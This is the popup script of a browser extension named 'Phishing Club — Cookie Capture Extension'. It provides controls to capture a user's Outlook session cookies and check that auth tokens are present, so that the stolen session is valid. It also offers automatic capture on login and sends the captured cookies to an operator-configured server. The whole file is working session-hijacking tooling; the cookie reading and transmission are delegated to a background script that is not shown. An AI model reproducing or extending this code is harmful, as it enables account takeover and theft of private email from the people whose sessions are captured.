/**
 * Phishing Club — Cookie Capture Extension (Popup Script)
 */

let isConnected = false;
let currentServerUrl = '';
let latestCapture = null;

// ── Safe message sender ────────────────────────────────────────────────────

function safeSendMessage(msg, callback) {
  try {
    chrome.runtime.sendMessage(msg, (resp) => {
      if (chrome.runtime.lastError) return;
      if (callback) callback(resp);
    });
  } catch (e) {
    // Extension context invalidated
  }
}

// ── Init ────────────────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', () => {
  loadSettings();
  loadCapturedCookies();
  setupListeners();
});

// ── Load saved settings ─────────────────────────────────────────────────────

function loadSettings() {
  safeSendMessage({ action: 'getSettings' }, (resp) => {
    if (!resp) return;
    document.getElementById('enabledToggle').checked = resp.enabled !== false;
    document.getElementById('autoCaptureToggle').checked = resp.autoCapture !== false;
    document.getElementById('autoCaptureOnLoginToggle').checked = resp.autoCaptureOnLogin !== false;
    document.getElementById('notificationsToggle').checked = resp.notifications !== false;
    document.getElementById('serverUrl').value = resp.serverUrl || '';
    currentServerUrl = resp.serverUrl || '';
    isConnected = resp.connected || false;
    updateConnectButton();
  });
}

// ── Load captured cookies ───────────────────────────────────────────────────

function loadCapturedCookies() {
  safeSendMessage({ action: 'getCapturedCookies' }, (resp) => {
    if (!resp) return;
    const captures = resp.cookies || [];
    renderHistory(captures);

    // Show latest capture result if exists
    if (captures.length > 0) {
      latestCapture = captures[0];
      showCaptureResult(latestCapture);
    }
  });
}

function showCaptureResult(capture) {
  const el = document.getElementById('captureResult');
  el.style.display = 'block';

  document.getElementById('cookieCount').textContent = capture.totalCount;
  document.getElementById('criticalCount').textContent = capture.criticalCount || 0;
  document.getElementById('domainCount').textContent = Object.keys(capture.domainGroups || {}).length;

  // Auth status
  const authEl = document.getElementById('authStatus');
  if (capture.hasCriticalAuth) {
    authEl.className = 'auth-status ok';
    authEl.textContent = 'Auth tokens found - session should be valid';
  } else {
    authEl.className = 'auth-status warn';
    authEl.textContent = 'Warning: No auth tokens found - sign into Outlook first';
  }

  // Domain tags
  const tagsEl = document.getElementById('domainTags');
  tagsEl.innerHTML = '';
  for (const domain of Object.keys(capture.domainGroups || {})) {
    const tag = document.createElement('span');
    tag.className = 'domain-tag';
    tag.textContent = domain;
    tagsEl.appendChild(tag);
  }

  // Send button state
  const sendBtn = document.getElementById('sendCookiesBtn');
  if (capture.sent) {
    sendBtn.textContent = 'Sent to Server';
    sendBtn.style.background = '#059669';
    sendBtn.disabled = false;
  } else {
    sendBtn.textContent = 'Send to Server';
    sendBtn.style.background = '#059669';
    sendBtn.disabled = !currentServerUrl;
  }
}

function renderHistory(captures) {
  const list = document.getElementById('historyList');

  if (captures.length === 0) {
    list.innerHTML = '<div class="no-items">No captures yet. Sign into Outlook and click "Capture Outlook Cookies".</div>';
    return;
  }

  list.innerHTML = '';
  captures.forEach((capture, i) => {
    const el = document.createElement('div');
    el.className = `history-item ${capture.sent ? 'sent' : 'unsent'}`;

    const time = new Date(capture.timestamp).toLocaleString();
    const domains = Object.keys(capture.domainGroups || {}).length;
    const statusClass = capture.sent ? 'ok' : 'pending';
    const statusText = capture.sent ? 'Sent' : 'Not sent';

    el.innerHTML = `
      <div class="history-time">${time}</div>
      <div class="history-info">
        <span>${capture.totalCount} cookies from ${domains} domains</span>
        <span class="history-status ${statusClass}">${statusText}</span>
      </div>
      ${!capture.sent && currentServerUrl ? `
        <div class="history-actions">
          <button class="btn btn-sm btn-send" data-send="${i}">Send</button>
        </div>
      ` : ''}
    `;
    list.appendChild(el);
  });

  // Send buttons
  list.querySelectorAll('[data-send]').forEach(btn => {
    btn.addEventListener('click', () => {
      const idx = parseInt(btn.dataset.send);
      btn.textContent = 'Sending...';
      btn.disabled = true;
      safeSendMessage({
        action: 'sendCookies',
        serverUrl: currentServerUrl,
        cookieData: captures[idx]
      }, (resp) => {
        if (resp && resp.success) {
          btn.textContent = 'Sent!';
          loadCapturedCookies();
        } else {
          btn.textContent = 'Failed';
          btn.disabled = false;
          setTimeout(() => { btn.textContent = 'Send'; }, 2000);
        }
      });
    });
  });
}

// ── Update Connect button state ─────────────────────────────────────────────

function updateConnectButton() {
  const btn = document.getElementById('connectBtn');
  if (isConnected) {
    btn.textContent = 'Connected';
    btn.classList.add('connected');
  } else {
    btn.textContent = 'Connect';
    btn.classList.remove('connected');
  }
}

function setStatus(msg, type) {
  const el = document.getElementById('statusMsg');
  el.textContent = msg;
  el.className = `status-msg ${type}`;
}

// ── Event listeners ─────────────────────────────────────────────────────────

function setupListeners() {
  // Connect button
  document.getElementById('connectBtn').addEventListener('click', () => {
    const url = document.getElementById('serverUrl').value.trim();

    if (!url) {
      setStatus('Enter your Phishing Club server URL first', 'err');
      return;
    }

    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      setStatus('URL must start with http:// or https://', 'err');
      return;
    }

    const btn = document.getElementById('connectBtn');
    btn.textContent = 'Connecting...';
    btn.disabled = true;
    setStatus('Testing connection...', 'info');

    // Save URL
    safeSendMessage({ action: 'updateSettings', settings: { serverUrl: url } });
    currentServerUrl = url;

    // Test connection
    safeSendMessage({ action: 'testConnection', serverUrl: url }, (resp) => {
      btn.disabled = false;
      if (resp && resp.success) {
        isConnected = true;
        const versionInfo = resp.version ? ` (v${resp.version})` : '';
        setStatus(`Connected to server${versionInfo}`, 'ok');
      } else {
        isConnected = false;
        setStatus(`${resp?.error || 'Could not reach server'}`, 'err');
      }
      updateConnectButton();
    });
  });

  // Capture button
  document.getElementById('captureBtn').addEventListener('click', () => {
    const btn = document.getElementById('captureBtn');
    btn.textContent = 'Capturing...';
    btn.disabled = true;

    safeSendMessage({ action: 'captureCookies' }, (resp) => {
      btn.disabled = false;
      btn.textContent = 'Capture Outlook Cookies';

      if (resp && resp.success) {
        loadCapturedCookies();
      } else {
        setStatus(resp?.error || 'Failed to capture cookies', 'err');
      }
    });
  });

  // Send cookies button
  document.getElementById('sendCookiesBtn').addEventListener('click', () => {
    if (!latestCapture || !currentServerUrl) return;

    const btn = document.getElementById('sendCookiesBtn');
    btn.textContent = 'Sending...';
    btn.disabled = true;

    safeSendMessage({
      action: 'sendCookies',
      serverUrl: currentServerUrl,
      cookieData: latestCapture
    }, (resp) => {
      if (resp && resp.success) {
        btn.textContent = 'Sent!';
        loadCapturedCookies();
      } else {
        btn.textContent = 'Failed - Retry';
        btn.disabled = false;
        setStatus(resp?.error || 'Failed to send cookies to server', 'err');
      }
    });
  });

  // Toggle handlers
  document.getElementById('enabledToggle').addEventListener('change', (e) => {
    safeSendMessage({ action: 'updateSettings', settings: { enabled: e.target.checked } });
  });
  document.getElementById('autoCaptureToggle').addEventListener('change', (e) => {
    safeSendMessage({ action: 'updateSettings', settings: { autoCapture: e.target.checked } });
  });
  document.getElementById('autoCaptureOnLoginToggle').addEventListener('change', (e) => {
    safeSendMessage({ action: 'updateSettings', settings: { autoCaptureOnLogin: e.target.checked } });
  });
  document.getElementById('notificationsToggle').addEventListener('change', (e) => {
    safeSendMessage({ action: 'updateSettings', settings: { notifications: e.target.checked } });
  });

  // Clear all
  document.getElementById('clearBtn').addEventListener('click', () => {
    if (confirm('Clear all captured cookies?')) {
      safeSendMessage({ action: 'clearCookies' }, () => {
        safeSendMessage({ action: 'clearTokens' }, () => {
          document.getElementById('captureResult').style.display = 'none';
          latestCapture = null;
          loadCapturedCookies();
        });
      });
    }
  });
}
